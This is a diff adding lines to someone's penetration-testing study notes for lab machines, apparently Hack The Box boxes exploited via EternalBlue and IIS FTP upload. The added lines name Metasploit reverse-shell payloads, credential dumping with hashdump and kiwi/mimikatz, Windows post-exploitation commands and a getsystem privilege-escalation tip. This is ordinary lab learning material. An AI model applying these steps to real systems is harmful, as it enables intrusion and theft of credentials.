@@ -86,6 +86,15 @@ nmap --script vuln -p445 10.10.10.3   reports windows/smb/ms17_010_eternalblue)
 
 didnt work on first try, resetted machine, tried other exploits, but this one eventually worked. 
 
+##### video stuff
+original exploit uses generic shell, but it is possible to "set payload windows/x64/meterpreter/reverse_tcp"  for improvement
+
+*Autoblue* can be used and can deselect meterpreter (OSCP lol) . more manual and not msf
+
+postexploit in windows: hashdump(meterpreter) , route print(shell) , arp -a(shell) , netstat -ano ( shell), ps (meterpreter)
+
+meterpreter > load kiwi, mimikatz , a lot of stuff. Kiwi  : samdump, dumpsecrets
+
 ## devel
 IIS7 with file upload by FTP. 
 
@@ -107,6 +116,10 @@ background and session management.. anyway all thanks to https://x64.moe/hackthe
 
 use post/multi/recon/local_exploit_suggester    ## for local exploits, new for me
 
+##### video stuff
+/usr/share/wordlists/ for dirbuster and other tools
 
+FTP : if file transfer is failing, switch to binary mode with "I" option
 
+privesc : sometimes inside meterpreter "getsystem" is enough lol ( not here)
 
